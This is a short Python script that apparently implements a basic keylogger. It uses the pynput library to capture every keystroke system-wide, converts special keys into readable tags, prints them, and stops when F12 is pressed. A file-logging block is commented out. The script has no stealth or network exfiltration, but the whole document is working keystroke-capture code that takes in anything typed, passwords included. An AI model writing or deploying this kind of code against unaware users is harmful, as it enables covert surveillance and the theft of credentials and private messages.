from pynput.keyboard import Listener

def beautify_key(key):
    switcher={
        "\"\"":"\'",
        "\\\\":"\\",
        "Key.ctrl_l":"[CTR_L]",
        "Key.enter":"[ENTER]",
        "Key.alt_l":"[ALT_L]",
        "Key.backspace":"[BACKSPACE]",
        "Key.space":"[SPACE]",
        "Key.shift_r":"[SHIFT_R]",
        "Key.caps_lock":"[CAPS_LOCK]",
        "Key.right":"[RIGHT]",
        "Key.up":"[UP]",
        "Key.down":"[DOWN]",
        "Key.left":"[LEFT]",
        "Key.ctrl_r":"[CTRL_R]",
        "Key.tab":"[TAB]",
        "Key.shift":"[SHIFT_L]",
        "Key.cmd":"[CMD]",
        "Key.alt_gr":"[ALT_R]",
        "Key.cmd_r":"[CMD_R]",
        "Key.menu":"[MENU]",
        "<96>":"[NUM_0]",
        "<97>":"[NUM_1]",
        "<98>":"[NUM_2]",
        "<99>":"[NUM_3]",
        "<100>":"[NUM_4]",
        "<101>":"[NUM_5]",
        "<102>":"[NUM_6]",
        "<103>":"[NUM_7]",
        "<104>":"[NUM_8]",
        "<105>":"[NUM_9]",
        "<110>":"[NUM_.]",
        "Key.num_lock":"[NUM_LOCK]",
        "Key.f1":"[F1]",
        "Key.f2":"[F2]",
        "Key.f3":"[F3]",
        "Key.f4":"[F4]",
        "Key.f5":"[F5]",
        "Key.f6":"[F6]",
        "Key.f7":"[F7]",
        "Key.f8":"[F8]",
        "Key.f9":"[F9]",
        "Key.f10":"[F10]",
        "Key.f11":"[F11]",
        "Key.f12":"[F12]",
        "Key.print_screen":"[PRINT_SCREEN]",
        "Key.scroll_lock":"[SCROLL_LOCK]",
        "Key.pause":"[PAUSE]",
        "Key.insert":"[INSERT]",
        "Key.home":"[HOME]",
        "Key.page_up":"[PAGE_UP]",
        "Key.page_down":"[PAGE_DOWN]",
        "Key.delete":"[DELETE]",
        "Key.end":"[END]",
        "Key.esc":"[ESC]"
    }
    return switcher.get(key, str(key))

def logging(key):
    key = str(key)
    key = key.replace("'","")

    if key == "Key.f12":
        raise SystemExit(0)
    
    key = beautify_key(key)
    print(key)

    # with open("log.txt", "a") as file:
    #     file.write(key)

with Listener(on_press=logging) as listener:
    listener.join()
